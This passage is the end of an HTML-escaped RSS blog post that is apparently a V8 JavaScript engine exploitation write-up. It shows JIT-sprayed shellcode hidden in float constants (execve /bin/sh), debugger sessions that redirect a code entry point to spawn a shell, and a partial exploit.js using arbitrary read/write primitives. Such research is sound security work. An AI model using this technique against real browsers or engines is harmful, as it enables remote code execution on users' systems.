&lt;span style="color:#ae81ff">1.95606125582421466942709801013&lt;/span>&lt;span style="color:#a6e22e">E&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">246&lt;/span>,
&lt;span style="color:#ae81ff">1.99957147195425773436923756715&lt;/span>&lt;span style="color:#a6e22e">E&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">246&lt;/span>,
&lt;span style="color:#ae81ff">1.95337673326740932133292175341&lt;/span>&lt;span style="color:#a6e22e">E&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">246&lt;/span>,
&lt;span style="color:#ae81ff">2.63486047652296056448306022844&lt;/span>&lt;span style="color:#a6e22e">E&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">284&lt;/span>
];
}
&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#a6e22e">PrepareFunctionForOptimization&lt;/span>(&lt;span style="color:#a6e22e">foo&lt;/span>);
&lt;span style="color:#a6e22e">foo&lt;/span>();
&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#a6e22e">OptimizeFunctionOnNextCall&lt;/span>(&lt;span style="color:#a6e22e">foo&lt;/span>);
&lt;span style="color:#a6e22e">foo&lt;/span>();
&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#a6e22e">DebugPrint&lt;/span>(&lt;span style="color:#a6e22e">foo&lt;/span>);
&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#a6e22e">SystemBreak&lt;/span>();
&lt;span style="color:#a6e22e">foo&lt;/span>();
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&amp;hellip;&lt;/p>
&lt;pre>&lt;code>pwndbg&amp;gt; job 0x25ea0019a215
0x25ea0019a215: [CodeDataContainer] in OldSpace
- map: 0x25ea00002a71 &amp;lt;Map[28](CODE_DATA_CONTAINER_TYPE)&amp;gt;
- kind: TURBOFAN
- is_off_heap_trampoline: 0
- code: 0x564b80004001 &amp;lt;Code TURBOFAN&amp;gt;
- code_entry_point: 0x564b80004040
- kind_specific_flags: 4
pwndbg&amp;gt; x/40i 0x564b80004040
...
0x564b800040ba: movabs r10,0xceb580068732f68
0x564b800040c4: vmovq xmm0,r10
0x564b800040c9: vmovsd QWORD PTR [rcx+0xf],xmm0
0x564b800040ce: movabs r10,0xceb5a6e69622f68
0x564b800040d8: vmovq xmm0,r10
0x564b800040dd: vmovsd QWORD PTR [rcx+0x17],xmm0
0x564b800040e2: movabs r10,0xcebf63120e0c148
0x564b800040ec: vmovq xmm0,r10
0x564b800040f1: vmovsd QWORD PTR [rcx+0x1f],xmm0
0x564b800040f6: movabs r10,0xceb50d231d00148
...
&lt;/code>&lt;/pre>&lt;p>&amp;hellip;&lt;/p>
&lt;pre>&lt;code>pwndbg&amp;gt; x/gx 0x564b800040ba+2
0x564b800040bc: 0x0ceb580068732f68
pwndbg&amp;gt; p/x (0x564b800040ba+2)-0x564b80004040
$1 = 0x7c
pwndbg&amp;gt; set *(int64_t *)(0x25ea0019a215-1+0xc) = 0x564b80004040+0x7c
pwndbg&amp;gt; job 0x25ea0019a215
0x25ea0019a215: [CodeDataContainer] in OldSpace
- map: 0x25ea00002a71 &amp;lt;Map[28](CODE_DATA_CONTAINER_TYPE)&amp;gt;
- kind: TURBOFAN
- is_off_heap_trampoline: 0
- code: 0x564b80004001 &amp;lt;Code TURBOFAN&amp;gt;
- code_entry_point: 0x564b800040bc
- kind_specific_flags: 4
&lt;/code>&lt;/pre>&lt;p>&amp;hellip;&lt;/p>
&lt;pre>&lt;code>pwndbg&amp;gt; c
Continuing.
[Thread 0x7f07a4162700 (LWP 288626) exited]
[Thread 0x7f07a4963700 (LWP 288625) exited]
[Thread 0x7f07a5164700 (LWP 288624) exited]
process 288620 is executing new program: /usr/bin/dash
$ id
&lt;/code>&lt;/pre>&lt;h3 id="36-building-an-exploit">3.6. Building an Exploit&lt;/h3>
&lt;p>&amp;hellip;&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75715e">/* ... */&lt;/span>
&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">code&lt;/span> &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#a6e22e">arb_read&lt;/span>(&lt;span style="color:#a6e22e">addrof&lt;/span>(&lt;span style="color:#a6e22e">foo&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x18&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span>) &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span>) &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">0xffffffff&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span>;
&lt;span style="color:#75715e">/* ... */&lt;/span>
&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">entry&lt;/span> &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#a6e22e">arb_read&lt;/span>(&lt;span style="color:#a6e22e">code&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0xc&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span>));
&lt;span style="color:#75715e">/* ... */&lt;/span>
&lt;span style="color:#a6e22e">arb_write&lt;/span>(&lt;span style="color:#a6e22e">code&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0xc&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span>, &lt;span style="color:#a6e22e">entry&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x7c&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span>);
&lt;/code>&lt;/pre>&lt;/div>
&lt;div class="collapsable-code">
&lt;input id="2" type="checkbox" checked />
&lt;label for="2">
&lt;span class="collapsable-code__language">js&lt;/span>
&lt;span class="collapsable-code__title">exploit.js&lt;/span>
&lt;span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide">&lt;/span>
&lt;/label>
&lt;pre class="language-js" >&lt;code>
var bs = new ArrayBuffer(8);
var fs = new Float64Array(bs);
var is = new BigUint64Array(bs);
/* converts a float to a 64-bit uint */
function ftoi(x) {
fs[0] = x;
return is[0];
}
/* converts a 64-bit uint to a float */
function itof(x) {
is[0] = x;
return fs[0];
}
/* execve(&amp;#34;/bin/sh&amp;#34;, 0, 0); */
const foo = () =&amp;gt; {
return [
1.0,
1.95538254221075331056310651818E-246,
1.95606125582421466942709801013E-246,
1.99957147195425773436923756715E-246,
1.95337673326740932133292175341E-246,
2.63486047652296056448306022844E-284
];
}
for (let i = 0; i &amp;lt; 0x10000; i&amp;#43;&amp;#43;)
foo();
&lt;/code>&lt;/pre>
&lt;/div>
&lt;h2 id="references">References&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8">V8 Sandbox - High-Level Design Doc&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://docs.google.com/document/d/1V3sxltuFjjhp_6grGHgfqZNK57qfzGzme0QTk0IXDHk">V8 Sandbox - External Pointer Sandboxing&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://mem2019.github.io/jekyll/update/2022/02/06/DiceCTF-Memory-Hole.html">Dice CTF Memory Hole: Breaking V8 Heap Sandbox&lt;/a>&lt;/li>
&lt;/ul></content></item></channel></rss>